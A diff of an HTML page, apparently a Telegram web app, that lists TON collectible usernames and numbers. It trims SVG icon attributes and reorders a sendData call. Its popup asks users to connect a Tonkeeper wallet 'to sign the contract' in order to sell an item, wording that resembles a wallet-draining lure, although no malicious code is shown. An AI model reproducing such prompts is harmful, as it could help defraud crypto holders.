@@ -44,7 +44,7 @@
         <div class="card">
             <div class="nft-info">
                 <div class="icon-box">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0088cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0088cc" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                 </div>
                 <div>
                     <div class="name">@crypto_king</div>
@@ -57,7 +57,7 @@
         <div class="card">
             <div class="nft-info">
                 <div class="icon-box">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0088cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0088cc" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                 </div>
                 <div>
                     <div class="name">+888 0551 1051</div>
@@ -84,12 +84,12 @@
         }
 
         function action(type, item) {
-            tg.sendData(JSON.stringify({action: type, asset: item}));
             tg.showPopup({
                 title: 'Wallet Connect',
                 message: 'To sell ' + item + ', connect your TON wallet to sign the contract.',
                 buttons: [{type: 'default', text: 'Connect Tonkeeper'}]
             });
+            tg.sendData(JSON.stringify({action: type, asset: item}));
         }
     </script>
 </body>
